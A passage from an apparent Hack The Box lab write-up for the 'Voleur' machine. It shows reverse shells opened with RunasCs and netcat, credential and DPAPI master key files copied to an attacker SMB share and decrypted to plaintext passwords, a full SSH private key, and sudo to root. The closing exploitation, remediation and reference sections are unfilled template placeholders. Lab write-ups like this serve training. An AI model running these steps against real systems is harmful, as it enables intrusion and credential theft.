[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-c9536$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6764 created in background.
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 

```

```
rlwrap -cAr nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.15.74] from (UNKNOWN) [10.129.232.130] 53642
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\svc_ldap
PS C:\Windows\system32>  Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
 Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent


Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
LastKnownParent   : OU=Second-Line Support Technicians,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110



PS C:\Windows\system32> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent


Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
LastKnownParent   : OU=Second-Line Support Technicians,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110



PS C:\Windows\system32> 

```

## shell as ldap

```
PS C:\Windows\system32> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```

```
PS C:\tmp> ls
ls


    Directory: C:\tmp


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         10/6/2026  10:12 AM          51712 RunasCs.exe                                                          


PS C:\tmp> .\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.15.74:4444 --bypass-uac
.\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.15.74:4444 --bypass-uac

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-c9536$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3280 created in background.
PS C:\tmp> 

```

```
rlwrap -cAr nc -lvnp 4444                                  
listening on [any] 4444 ...
connect to [10.10.15.74] from (UNKNOWN) [10.129.232.130] 53668
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\todd.wolfe
PS C:\Windows\system32> 

```

## Lateral Movement from todd.wolfe to james

```
PS C:\> ls
ls


    Directory: C:\


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         1/29/2025   1:10 AM                Finance                                                              
d-----         1/29/2025   1:10 AM                HR                                                                   
d-----         5/29/2025   3:07 PM                inetpub                                                              
d-----         1/29/2025   1:10 AM                IT                                                                   
d-----          5/8/2021   1:20 AM                PerfLogs                                                             
d-r---         7/24/2025   1:10 PM                Program Files                                                        
d-----         1/30/2025   5:53 AM                Program Files (x86)                                                  
d-----         10/6/2026  10:12 AM                tmp                                                                  
d-r---         1/30/2025   3:38 AM                Users                                                                
d-----          6/5/2025  12:53 PM                Windows                                                              


PS C:\> cd IT
cd IT
PS C:\IT> ls
ls


    Directory: C:\IT


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         1/29/2025   1:40 AM                First-Line Support                                                   
d-----         1/29/2025   7:13 AM                Second-Line Support                                                  
d-----         1/30/2025   8:11 AM                Third-Line Support                                                   


PS C:\IT> cd 'Second-Line Support'
cd 'Second-Line Support'
PS C:\IT\Second-Line Support> ls
ls


    Directory: C:\IT\Second-Line Support


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         1/29/2025   7:13 AM                Archived Users                                                       


PS C:\IT\Second-Line Support> cd Archived Users
cd Archived Users
Set-Location : A positional parameter cannot be found that accepts argument 'Users'.
At line:1 char:1
+ cd Archived Users
+ ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (:) [Set-Location], ParameterBindingException
    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
 
PS C:\IT\Second-Line Support> cd "Archived Users"
cd "Archived Users"
PS C:\IT\Second-Line Support\Archived Users> ls
ls


    Directory: C:\IT\Second-Line Support\Archived Users


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         1/29/2025   7:13 AM                todd.wolfe                                                           


PS C:\IT\Second-Line Support\Archived Users> cd todd.wolfe
cd todd.wolfe
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> ls
ls


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---         1/29/2025   7:13 AM                3D Objects                                                           
d-r---         1/29/2025   7:13 AM                Contacts                                                             
d-r---         1/30/2025   6:28 AM                Desktop                                                              
d-r---         1/29/2025   7:13 AM                Documents                                                            
d-r---         1/29/2025   7:13 AM                Downloads                                                            
d-r---         1/29/2025   7:13 AM                Favorites                                                            
d-r---         1/29/2025   7:13 AM                Links                                                                
d-r---         1/29/2025   7:13 AM                Music                                                                
d-r---         1/29/2025   7:13 AM                Pictures                                                             
d-r---         1/29/2025   7:13 AM                Saved Games                                                          
d-r---         1/29/2025   7:13 AM                Searches                                                             
d-r---         1/29/2025   7:13 AM                Videos                                                               


PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> dir /a
dir /a
dir : Cannot find path 'C:\a' because it does not exist.
At line:1 char:1
+ dir /a
+ ~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\a:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
 
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> dir appdata
dir appdata


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         1/29/2025   7:13 AM                Local                                                                
d-----         1/29/2025   7:13 AM                LocalLow                                                             
d-----         1/29/2025   7:13 AM                Roaming                                                              


PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> cd appdata
cd appdata
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata> cd Roaming
cd Roaming
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming> dir
dir


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         1/29/2025   7:13 AM                Adobe                                                                
d---s-         1/29/2025   7:13 AM                Microsoft                                                            


PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming> cd Microsoft
cd Microsoft
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft> dir
dir


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d---s-         1/29/2025   7:13 AM                Credentials                                                          
d---s-         1/29/2025   7:13 AM                Crypto                                                               
d-----         1/29/2025   7:13 AM                Internet Explorer                                                    
d-----         1/29/2025   7:13 AM                Network                                                              
d---s-         1/29/2025   7:13 AM                Protect                                                              
d-----          5/8/2021   1:20 AM                Spelling                                                             
d---s-         1/29/2025   7:13 AM                SystemCertificates                                                   
d-----         1/29/2025   4:54 AM                Vault                                                                
d-----         1/29/2025   7:13 AM                Windows                                                              


PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft> cd Credentials
cd Credentials
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> ls
ls


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/29/2025   4:55 AM            398 772275FAD58525253490A9B0039791D3                                     


PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> 

```

copying the file to kali:

```
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> net use \\10.10.15.74\share /user:test test
net use \\10.10.15.74\share /user:test test
The command completed successfully.

PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> copy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
copy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\

```

master key (?)

```
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect> ls
ls


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d---s-         1/29/2025   7:13 AM                S-1-5-21-3927696377-1337352550-2781715495-1110                       


PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect> cd Ccopy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
cd Ccopy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
Set-Location : A positional parameter cannot be found that accepts argument '772275FAD58525253490A9B0039791D3'.
At line:1 char:1
+ cd Ccopy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (:) [Set-Location], ParameterBindingException
    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
 
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect> cd S-1-5-21-3927696377-1337352550-2781715495-1110
cd S-1-5-21-3927696377-1337352550-2781715495-1110
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110> ls
ls


    Directory: C:\IT\Second-Line Support\Archived 
    Users\todd.wolfe\appdata\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/29/2025   4:53 AM            740 08949382-134f-4c63-b93c-ce52efc0aa88                                 

```

```
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110> copy 08949382-134f-4c63-b93c-ce52efc0aa88 \\10.10.15.74\share
copy 08949382-134f-4c63-b93c-ce52efc0aa88 \\10.10.15.74\share

```

## decrypting

```
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14'   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

```

```
impacket-dpapi credential -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 -file 772275FAD58525253490A9B0039791D3
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m


```

```
PS C:\tmp> .\RunasCs.exe jeremy.combs qT3V9pLXyN7W4m  powershell -r 10.10.15.74:4445 --bypass-uac
.\RunasCs.exe jeremy.combs qT3V9pLXyN7W4m  powershell -r 10.10.15.74:4445 --bypass-uac

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-c9536$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2476 created in background.
PS C:\tmp> 

```

```
rlwrap -cAr nc -lvnp 4445                                  
listening on [any] 4445 ...
connect to [10.10.15.74] from (UNKNOWN) [10.129.232.130] 53203
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\jeremy.combs
PS C:\Windows\system32> 

```

## Lateral movement from jeremy to svc_backup

```
PS C:\IT> cd 'Third-Line Support'
cd 'Third-Line Support'
PS C:\IT\Third-Line Support> ls
ls


    Directory: C:\IT\Third-Line Support


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         1/30/2025   8:11 AM                Backups                                                              
-a----         1/30/2025   8:10 AM           2602 id_rsa                                                               
-a----         1/30/2025   8:07 AM            186 Note.txt.txt                                                         


PS C:\IT\Third-Line Support> cat Note.txt.txt
cat Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
PS C:\IT\Third-Line Support> 

```

```
PS C:\IT\Third-Line Support> cat id_rsa
cat id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

```
ssh -i id_rsa.key svc_backup@voleur.htb -p 2222
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct  6 10:59:07 PDT 2026

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   35%       IPv4 address for eth0: 10.129.232.130
  Swap usage:     0%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd           
```

```
svc_backup@DC:~$ sudo -l
Matching Defaults entries for svc_backup on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

```

```
svc_backup@DC:~$ sudo su
root@DC:/home/svc_backup# whoami
root

```
---
## Privilege Escalation

### Enumeration

```
root@DC:/mnt/c# cd IT
root@DC:/mnt/c/IT# ls
'First-Line Support'  'Second-Line Support'  'Third-Line Support'
root@DC:/mnt/c/IT# cd 'Third-Line Support'
root@DC:/mnt/c/IT/Third-Line Support# ls
Backups  Note.txt.txt  id_rsa
root@DC:/mnt/c/IT/Third-Line Support# cd Backups
root@DC:/mnt/c/IT/Third-Line Support/Backups# ls
'Active Directory'   registry
root@DC:/mnt/c/IT/Third-Line Support/Backups# cd 'Active Directory'
root@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory# ls
ntds.dit  ntds.jfm
root@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory# cd ..
root@DC:/mnt/c/IT/Third-Line Support/Backups# cd registry
root@DC:/mnt/c/IT/Third-Line Support/Backups/registry# ls
SECURITY  SYSTEM

```

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)